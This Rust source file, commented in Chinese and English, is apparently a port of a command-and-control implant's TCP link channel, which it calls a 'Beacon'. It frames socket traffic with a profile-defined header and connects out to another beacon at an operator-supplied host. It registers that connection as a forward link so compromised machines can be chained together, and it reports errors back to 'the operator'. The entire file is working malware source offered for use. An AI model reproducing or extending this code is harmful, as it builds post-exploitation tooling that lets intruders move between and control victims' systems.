//! src/link_tcp.cpp 的移植版 —— TCP 套接字链接通道。
//! Port of src/link_tcp.cpp — TCP socket link channel.
//!
//! `lchannel_tcp` 把已连接的套接字包装成 `LChannel`（阻塞 I/O），
//! 与 SMB 通道一样使用 `tcp_frame_header` 配置数据块对数据进行帧封装。
//! `command_tcp_connect` 向外连接一个 Beacon，并把套接字注册为正向 TCP 链接，
//! 最多重试 15 秒。
//! `lchannel_tcp` wraps a connected socket as an `LChannel` (blocking I/O),
//! framing data with the `tcp_frame_header` profile blob just like the SMB
//! channel. `command_tcp_connect` connects out to a beacon and registers the
//! socket as a forward TCP link, retrying for up to 15s.

use crate::beacon::SETTING_TCP_FRAME_HEADER;
use crate::callback::{post_error_d, Callback};
use crate::channel_tcp::channel_winsock_init;
use crate::commands::wsconnect;
use crate::link::{link_frame_header, link_register, LChannel};
use crate::parse::DataP;
use std::ffi::c_void;
use windows_sys::Win32::Networking::WinSock::{
    closesocket, ioctlsocket, recv, send, shutdown, WSAGetLastError, FIONBIO, INVALID_SOCKET, MSG_PEEK, SD_BOTH, SOCKET,
    SOCKET_ERROR, WSAEWOULDBLOCK,
};
use windows_sys::Win32::System::SystemInformation::GetTickCount;

/// 轮询我们的套接字，看它是否准备好读取（is_ready）。
/// Poll our socket and see if it's ready to be read from (is_ready).
fn is_ready(my_socket: isize, timeout: i32) -> bool {
    let until = unsafe { GetTickCount().wrapping_add(timeout as u32) };
    let mut result = false;

    unsafe {
        // 把我们的套接字设为非阻塞，这样我们可以窥探发生了什么。
        // Make our socket non-blocking, so we can peek at what's happening.
        let mut mode: u32 = 1;
        if ioctlsocket(my_socket as SOCKET, FIONBIO, &mut mode) == SOCKET_ERROR {
            return false;
        }

        // 窥探数据直到超时。
        // Peek data until our timeout.
        let mut buffer: u8 = 0;
        while GetTickCount() < until {
            let status = recv(my_socket as SOCKET, &mut buffer, 1, MSG_PEEK);

            // 套接字被正常关闭。
            // Socket was gracefully closed.
            if status == 0 {
                result = false;
                break;
            }
            // 有数据可用了。
            // Data is available, yay.
            else if status > 0 {
                result = true;
                break;
            }
            // 我们会阻塞，所以再试一次[直到超时]。
            // We would block, so try again [up to our timeout].
            else if WSAGetLastError() == WSAEWOULDBLOCK {
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
            // 其他套接字错误，放弃。
            // Some other socket error, bail.
            else {
                result = false;
                break;
            }
        }

        // 把我们的套接字重新设为阻塞。
        // Make our socket blocking again.
        mode = 0;
        if ioctlsocket(my_socket as SOCKET, FIONBIO, &mut mode) == SOCKET_ERROR {
            return false;
        }
    }

    result
}

/// 通过套接字发送一帧。需要 TRUE/FALSE 返回值（send_frame）。
/// Send a frame via a socket. Need TRUE/FALSE return value (send_frame).
fn send_frame(my_socket: isize, buffer: &[u8], length: usize) -> bool {
    if length == 0 {
        return true;
    }
    unsafe {
        if send(my_socket as SOCKET, buffer.as_ptr(), length as i32, 0) == SOCKET_ERROR {
            return false;
        }
    }
    true
}

/// 从套接字接收一帧。需要 >0/0/<0 返回值（recv_frame）。
/// Receive a frame from a socket. Need >0/0/<0 return value (recv_frame).
fn recv_frame(my_socket: isize, buffer: &mut [u8], size: usize) -> i32 {
    let mut total = 0usize;

    // 读入结果。
    // Read in the result.
    unsafe {
        while total < size {
            let temp = recv(
                my_socket as SOCKET,
                buffer[total..].as_mut_ptr(),
                (size - total) as i32,
                0,
            );
            if temp == SOCKET_ERROR {
                return -1;
            } else if temp == 0 {
                break;
            }
            total += temp as usize;
        }
    }

    if total != size {
        return -1;
    }
    size as i32
}

/// 实现我们的 TCP Beacon 模块（link_channel_tcp_read）。
/// Implement our TCP Beacon module (link_channel_tcp_read).
unsafe extern "C" fn link_channel_tcp_read(thisp: *mut c_void, buffer: *mut u8, max: usize) -> i32 {
    let inst = thisp as *const LChannel;
    let socket = (*inst).socket;

    // 把长度读入一个格式化的帧。
    // Read our length into a pro-forma frame.
    let mut flen = 0usize;
    let mut frame = link_frame_header(SETTING_TCP_FRAME_HEADER as i32, 0, &mut flen);
    if flen < 4 {
        return -1;
    }
    let rlen = recv_frame(socket, &mut frame, flen);
    if rlen == -1 || rlen as usize != flen {
        return -1;
    }

    // 提取我们的长度值（原始主机字节序 int）。
    // Extract our length value (raw host-order int).
    let get = i32::from_ne_bytes(frame[flen - 4..flen].try_into().unwrap());

    // 对我们的 get 值做健全性检查。
    // Sanity check our get value.
    if get > max as i32 || get < 0 {
        return -1;
    }
    if get == 0 {
        return 0;
    }
    let out = std::slice::from_raw_parts_mut(buffer, get as usize);
    recv_frame(socket, out, get as usize)
}

/// 通过 TCP 通道写入一帧（link_channel_tcp_write）。
/// Write a frame via the TCP channel (link_channel_tcp_write).
unsafe extern "C" fn link_channel_tcp_write(thisp: *mut c_void, buffer: *const u8, length: usize) -> i32 {
    let inst = thisp as *const LChannel;
    let socket = (*inst).socket;

    // 构建并写入我们的帧头。
    // Build and write our frame header.
    let mut flen = 0usize;
    let frame = link_frame_header(SETTING_TCP_FRAME_HEADER as i32, length as i32, &mut flen);
    if !send_frame(socket, &frame, flen) {
        return 0;
    }

    // 写入整个数据包。
    // Write the entire package.
    let payload = if length == 0 {
        &[]
    } else {
        std::slice::from_raw_parts(buffer, length)
    };
    if send_frame(socket, payload, length) {
        1
    } else {
        0
    }
}

/// 关闭 TCP 通道（link_channel_tcp_close）。
/// Close the TCP channel (link_channel_tcp_close).
unsafe extern "C" fn link_channel_tcp_close(thisp: *mut c_void) {
    let inst = thisp as *const LChannel;
    let socket = (*inst).socket;
    shutdown(socket as SOCKET, SD_BOTH);
    closesocket(socket as SOCKET);
}

/// 轮询 TCP 通道的可读性（link_channel_tcp_ready）。
/// Poll the TCP channel for readability (link_channel_tcp_ready).
unsafe extern "C" fn link_channel_tcp_ready(thisp: *mut c_void, timeout: i32) -> i32 {
    let inst = thisp as *const LChannel;
    if is_ready((*inst).socket, timeout) {
        1
    } else {
        0
    }
}

/// 什么都不做（link_channel_tcp_nop）。
/// Do nothing (link_channel_tcp_nop).
unsafe extern "C" fn link_channel_tcp_nop(_thisp: *mut c_void) {
    /* 什么都不做 / do nothing */
}

/// 初始化一个 SOCKET 链接通道（lchannel_tcp）。
/// Initialize a SOCKET link channel (lchannel_tcp).
pub fn lchannel_tcp(socket: isize) -> LChannel {
    // 我们 TCP 通道的契约：使用阻塞 I/O。
    // Contract of our TCP channel: use blocking I/O.
    unsafe {
        let mode: u32 = 0;
        ioctlsocket(socket as SOCKET, FIONBIO, &mode as *const u32 as *mut u32);
    }

    // 好了，设置实际的通道值。
    // OK, setup the actual channel value.
    LChannel {
        pipe: 0,
        socket,
        read: Some(link_channel_tcp_read),
        write: Some(link_channel_tcp_write),
        close: Some(link_channel_tcp_close),
        flush: Some(link_channel_tcp_nop),
        ready: Some(link_channel_tcp_ready),
        wait: Some(link_channel_tcp_nop),
    }
}

/// 通过 TCP 连接一个 Beacon 并注册链接（command_tcp_connect）。
/// Connect to a beacon over TCP and register the link (command_tcp_connect).
///
/// [port] - 2 字节（网络字节序）
/// [host] - ASCIIZ 主机名
/// [port] - 2 bytes (network order)
/// [host] - ASCIIZ host name
pub fn command_tcp_connect(buffer: &[u8], length: usize, cb: Callback) {
    let mut data = buffer[..length.min(buffer.len())].to_vec();
    let mut parser = DataP::init(&mut data);
    let port = parser.data_short() as i32;
    let host = parser.data_buffer();

    // 初始化我们的 winsock 套接字。
    // Init our winsock socket.
    channel_winsock_init();

    // 连接！
    // Connect!
    let stopat = unsafe { GetTickCount().wrapping_add(15000) };
    let mut client: isize = -1;
    unsafe {
        while GetTickCount() < stopat {
            client = wsconnect(host, port);
            if client == INVALID_SOCKET as isize {
                std::thread::sleep(std::time::Duration::from_millis(1000));
            } else {
                break;
            }
        }
    }

    // 如果上面失败了，请让操作员知道。
    // If we failed above, please let the operator know.
    if client == INVALID_SOCKET as isize {
        post_error_d(0x44, unsafe { WSAGetLastError() });
        return;
    }

    // 初始化我们的客户端（如果我们成功了）。
    // Initialize our client (IF we were successful).
    link_register(lchannel_tcp(client), crate::link::channel_forward_tcp(port), cb);
}
